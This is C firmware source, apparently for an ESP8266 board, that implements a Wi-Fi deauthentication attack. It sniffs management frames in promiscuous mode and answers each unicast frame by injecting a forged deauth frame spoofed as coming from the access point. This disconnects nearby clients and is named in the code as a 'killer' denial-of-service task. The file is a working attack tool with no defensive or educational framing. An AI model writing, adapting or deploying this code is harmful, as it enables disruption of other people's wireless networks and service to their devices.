#include "user_main.h"
#include "esp_common.h"
#include "FreeRTOS.h"
#include "task.h"
#include "uart.h"
#include "c_stdio.h"

uint16_t seq = 0;

static uint8_t boardcast[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
static uint8_t ap[6] = {0xec, 0x26, 0xca, 0x66, 0x66, 0x66};


void send_deauth_packet(uint8_t *sta, uint8_t *ap)
{
	os_printf("SEND: DEAUTH (AP => STA)\t");

	char packet_buffer[200] = {0};
	ieee80211_mgmt_frame mgmt;
	ets_bzero(&mgmt, sizeof(ieee80211_mgmt_frame));


	seq ++;
	mgmt.ctl.type = 0x00;
	mgmt.ctl.subtype = 0x0c;	//WLAN_FSTYPE_DEAUTHEN

	mgmt.duration = 0x13a;
	memcpy(&mgmt.addr1, sta, 6);		//DA
	memcpy(&mgmt.addr2, ap, 6);		//SA
	memcpy(&mgmt.addr3, ap, 6);		//BSSID

	mgmt.seq_ctrl = seq<<4;

	char pay_load[] = "\x01\x00";

	int i = 0;
	memcpy(&packet_buffer[i], &mgmt, sizeof(ieee80211_mgmt_frame));
	i = sizeof(ieee80211_mgmt_frame);
	memcpy(&packet_buffer[i], pay_load, sizeof(pay_load));
	i += sizeof(pay_load) - 1;

	int ret = wifi_send_pkt_freedom(packet_buffer, i , 0);

	os_printf("RESULT: %d\n", ret);

}

void deny_of_serivce(uint8_t *buf, unsigned int len)
{
	ieee80211_mgmt_frame *mgmt = (ieee80211_mgmt_frame *)buf;
	int type = mgmt->ctl.type;
	int subtype = mgmt->ctl.subtype;

	if (strcmp(mgmt->addr1,  boardcast) != 0x00)
	{
		send_deauth_packet(mgmt->addr2, mgmt->addr1);
		return;
	}
}

static void promisc_cb(uint8_t *buf, uint16_t len)
{
	struct RxPacket * pkt = (struct RxPacket*) buf;
	deny_of_serivce((uint8_t *)&pkt->data, len );
}

static void sniffer_system_init_done(void)
{
	wifi_station_disconnect();
	wifi_station_set_config(NULL);

	wifi_set_channel(1);			//SET CHANNEL
	wifi_promiscuous_enable(0);
	wifi_set_promiscuous_rx_cb(promisc_cb);	
	wifi_promiscuous_enable(1);

}

void killer_task(void *pvParameters) {
    printf("killer task init\n");
	
	wifi_set_opmode(STATION_MODE);

	sniffer_system_init_done();

	while (1)
	{
		// do something
		vTaskDelay(1000);
	}

	//vTaskDelete(NULL);
}

/******************************************************************************
 * FunctionName : user_init
 * Description  : entry of user application, init user function here
 * Parameters   : none
 * Returns      : none
*******************************************************************************/
void user_init(void)
{
    printf("SDK version:%s\n", system_get_sdk_version());

	uart_init_new();

	xTaskCreate(killer_task, "killer_task", 128, NULL, 4, NULL);
}

